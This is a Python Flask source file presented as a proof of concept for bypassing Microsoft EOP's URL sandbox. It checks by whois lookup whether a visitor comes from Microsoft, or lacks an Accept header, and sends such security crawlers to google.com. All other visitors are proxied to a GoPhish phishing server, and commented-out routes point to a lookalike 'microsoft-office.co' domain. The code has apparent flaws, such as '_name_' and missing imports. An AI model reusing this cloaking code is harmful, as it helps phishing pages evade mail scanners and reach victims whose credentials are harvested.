"""
Microsoft EOP URL sandbox bypass
PoC proxy server using client classification
Author: Nimrod (Nimi) Bickels
"""
from flask import Flask, request, redirect
from ipwhois import IPWhois

def is_microsoft_ans(ip):
    res = IPWhois(ip).lookup_rdap(depth=1)
    try:
        if 'microsoft' in res['objects']['MSFT']['contact']['name'].lower():
            return True
    except KeyError:
        pass
    return False

def crawler(fn):
    def wrapper(*args, **kwargs):
        client_ip = request.headers.get('X-Forwarded-For', '').split(',')[0] or request.remote_addr
        if is_microsoft_ans(client_ip) or not request.headers.get('Accept', ''):
            return redirect('https://google.com')
        return fn(*args, **kwargs)
    return wrapper

app = Flask(_name_)

# @app.route('/')
# @crawler
# def landing():
#     rid = request.args.get('rid')
#     if rid:
#         return redirect(f"https://microsoft-office.co/?url={rid}")
#     abort(404)

# @app.route('/track')
# @crawler
# def tracker():
#     rid = request.args.get('url')
#     if rid:
#         return redirect(f'https://microsoft-office.co/track?url={rid}')
#     abort(404)

@app.route('/', defaults={'path': ''}, methods=["GET", "POST"])
@app.route('/<path>', methods=["GET", "POST"])
@crawler
def redirect_to_gophish(path):
    res = requests.request(  # ref. https://stackoverflow.com/a/36601467/248616
        method          = request.method,
        url             = f"http://gophish:80/{path}",
        headers         = {k:v for k,v in request.headers if k.lower() != 'host'}, # exclude 'host' header
        data            = request.get_data(),
        cookies         = request.cookies,
        allow_redirects = False,
    )
    headers = [(k,v) for k,v in res.raw.headers.items()]

    response = Response(res.content, res.status_code, headers)
    return response